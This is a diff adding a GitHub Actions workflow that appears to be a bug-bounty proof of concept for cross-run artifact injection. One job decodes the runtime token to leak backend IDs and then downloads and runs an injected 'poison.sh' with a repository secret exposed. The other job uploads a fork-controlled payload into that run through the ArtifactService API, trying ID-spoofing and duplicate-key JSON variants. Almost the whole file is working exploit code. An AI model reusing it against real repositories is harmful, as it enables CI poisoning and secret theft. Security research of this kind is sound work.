@@ -1,0 +1,204 @@
+name: rez0 artifact scope 20261005T214656Z-12ce4764
+
+on:
+  push:
+    branches:
+      - "rez0-actions-boundary/20261005T214656Z-12ce4764/base"
+  pull_request:
+    branches:
+      - "rez0-actions-boundary/20261005T214656Z-12ce4764/base"
+
+permissions:
+  actions: read
+  contents: read
+
+jobs:
+  victim:
+    if: github.event_name == 'push'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Publish controlled target backend IDs
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs')
+            const token = process.env.ACTIONS_RUNTIME_TOKEN
+            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'))
+            const resultScope = String(payload.scp || '').split(' ').find(value => value.startsWith('Actions.Results:'))
+            if (!resultScope) throw new Error('Actions.Results scope missing')
+            const fields = resultScope.split(':')
+            if (fields.length !== 3) throw new Error('Actions.Results scope malformed')
+            fs.writeFileSync('target-ids.json', JSON.stringify({run: fields[1], job: fields[2]}), {mode: 0o600})
+            console.log('TARGET_BACKEND_IDS_READY')
+
+      - name: Make target IDs available to the controlled researcher
+        uses: actions/upload-artifact@v4
+        with:
+          name: rez0-target-ids-12ce4764
+          path: target-ids.json
+          retention-days: 1
+
+      - name: Poll this run for an injected artifact and execute only the synthetic canary
+        env:
+          GH_TOKEN: ${{ github.token }}
+          CONTROLLED_SECRET: ${{ secrets.REZ0_ARTIFACT_CANARY_12CE4764 }}
+          EXPECTED_DIGEST: 4ac167b50938eb1649fd0e77dc60ae96a24976c0c8510882dfe94ba5ca326de0
+          INJECTED_PREFIX: rez0-injected-12ce4764
+          REPOSITORY: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          ua='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
+          for attempt in $(seq 1 90); do
+            curl -fsS \
+              -H "Authorization: Bearer ${GH_TOKEN}" \
+              -H 'Accept: application/vnd.github+json' \
+              -H 'X-GitHub-Api-Version: 2022-11-28' \
+              -H 'X-Bug-Bounty: rez0' \
+              -A "$ua" \
+              "https://api.github.com/repos/${REPOSITORY}/actions/runs/${RUN_ID}/artifacts?per_page=100" \
+              -o artifacts.json
+            artifact_id="$(jq -r --arg prefix "$INJECTED_PREFIX" '.artifacts[] | select(.name | startswith($prefix)) | .id' artifacts.json | head -n 1)"
+            if [ -n "$artifact_id" ]; then
+              curl -fsSL \
+                -H "Authorization: Bearer ${GH_TOKEN}" \
+                -H 'Accept: application/vnd.github+json' \
+                -H 'X-GitHub-Api-Version: 2022-11-28' \
+                -H 'X-Bug-Bounty: rez0' \
+                -A "$ua" \
+                "https://api.github.com/repos/${REPOSITORY}/actions/artifacts/${artifact_id}/zip" \
+                -o injected.zip
+              mkdir injected
+              unzip -q injected.zip -d injected
+              chmod 700 injected/poison.sh
+              CONTROLLED_SECRET="$CONTROLLED_SECRET" EXPECTED_DIGEST="$EXPECTED_DIGEST" injected/poison.sh
+              exit 0
+            fi
+            sleep 10
+          done
+          echo 'VICTIM_NO_INJECTED_ARTIFACT'
+
+  attacker:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out fork-controlled payload
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Package fork-controlled payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          chmod 700 poison.sh
+          zip -q payload.zip poison.sh
+
+      - name: Exercise same-repository cross-run ArtifactService binding
+        uses: actions/github-script@v7
+        env:
+          TARGET_IDS: ${{ github.event.pull_request.body }}
+          INJECTED_PREFIX: rez0-injected-12ce4764
+        with:
+          script: |
+            const crypto = require('crypto')
+            const fs = require('fs')
+            const token = process.env.ACTIONS_RUNTIME_TOKEN
+            const ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
+            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'))
+            const resultScope = String(payload.scp || '').split(' ').find(value => value.startsWith('Actions.Results:'))
+            if (!resultScope) throw new Error('Actions.Results scope missing')
+            const fields = resultScope.split(':')
+            if (fields.length !== 3) throw new Error('Actions.Results scope malformed')
+            const own = {run: fields[1], job: fields[2]}
+            const target = JSON.parse(process.env.TARGET_IDS)
+            if (!/^[0-9a-f-]{30,}$/i.test(target.run) || !/^[0-9a-f-]{30,}$/i.test(target.job)) {
+              throw new Error('target IDs malformed')
+            }
+            const archive = fs.readFileSync('payload.zip')
+            const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin
+            const service = `${origin}/twirp/github.actions.results.api.v1.ArtifactService`
+
+            async function twirp(method, body) {
+              const response = await fetch(`${service}/${method}`, {
+                method: 'POST',
+                headers: {
+                  'Authorization': `Bearer ${token}`,
+                  'Content-Type': 'application/json',
+                  'X-Bug-Bounty': 'rez0',
+                  'User-Agent': ua
+                },
+                body: typeof body === 'string' ? body : JSON.stringify(body)
+              })
+              let value = {}
+              try { value = await response.json() } catch {}
+              return {status: response.status, value}
+            }
+
+            async function upload(signedUrl) {
+              const response = await fetch(signedUrl, {
+                method: 'PUT',
+                headers: {
+                  'Content-Type': 'application/octet-stream',
+                  'x-ms-blob-type': 'BlockBlob',
+                  'x-ms-version': '2021-12-02',
+                  'X-Bug-Bounty': 'rez0',
+                  'User-Agent': ua
+                },
+                body: archive
+              })
+              return response.status
+            }
+
+            function requestBody(ids, name) {
+              return {
+                workflow_run_backend_id: ids.run,
+                workflow_job_run_backend_id: ids.job,
+                name,
+                version: 4
+              }
+            }
+
+            async function exercise(label, ids, rawCreate) {
+              const name = `${process.env.INJECTED_PREFIX}-${label}`
+              const createBody = rawCreate || requestBody(ids, name)
+              const created = await twirp('CreateArtifact', createBody)
+              const signedUrl = typeof created.value.signed_upload_url === 'string' ? created.value.signed_upload_url : ''
+              let uploadStatus = 0
+              let finalized = {status: 0, value: {}}
+              if (created.value.ok === true && signedUrl) {
+                uploadStatus = await upload(signedUrl)
+                finalized = await twirp('FinalizeArtifact', {
+                  workflow_run_backend_id: ids.run,
+                  workflow_job_run_backend_id: ids.job,
+                  name,
+                  size: String(archive.length),
+                  hash: {value: `sha256:${crypto.createHash('sha256').update(archive).digest('hex')}`}
+                })
+              }
+              return {
+                label,
+                create_status: created.status,
+                create_ok: created.value.ok === true,
+                create_message: String(created.value.msg || created.value.message || '').slice(0, 160),
+                signed_url_present: Boolean(signedUrl),
+                upload_status: uploadStatus,
+                finalize_status: finalized.status,
+                finalize_ok: finalized.value.ok === true,
+                artifact_id_present: Boolean(finalized.value.artifact_id)
+              }
+            }
+
+            const prefix = process.env.INJECTED_PREFIX
+            const duplicateTargetLast = `{"workflow_run_backend_id":"${own.run}","workflow_run_backend_id":"${target.run}","workflow_job_run_backend_id":"${own.job}","workflow_job_run_backend_id":"${target.job}","name":"${prefix}-duplicate-target-last","version":4}`
+            const duplicateOwnLast = `{"workflow_run_backend_id":"${target.run}","workflow_run_backend_id":"${own.run}","workflow_job_run_backend_id":"${target.job}","workflow_job_run_backend_id":"${own.job}","name":"${prefix}-duplicate-own-last","version":4}`
+            const rows = []
+            rows.push(await exercise('own-control', own))
+            rows.push(await exercise('target-exact', target))
+            rows.push(await exercise('target-run-own-job', {run: target.run, job: own.job}))
+            rows.push(await exercise('own-run-target-job', {run: own.run, job: target.job}))
+            rows.push(await exercise('target-empty-job', {run: target.run, job: ''}))
+            rows.push(await exercise('duplicate-target-last', target, duplicateTargetLast))
+            rows.push(await exercise('duplicate-own-last', own, duplicateOwnLast))
+            console.log('ARTIFACT_SCOPE_MATRIX ' + JSON.stringify({own_id_shape: true, target_id_shape: true, rows}))
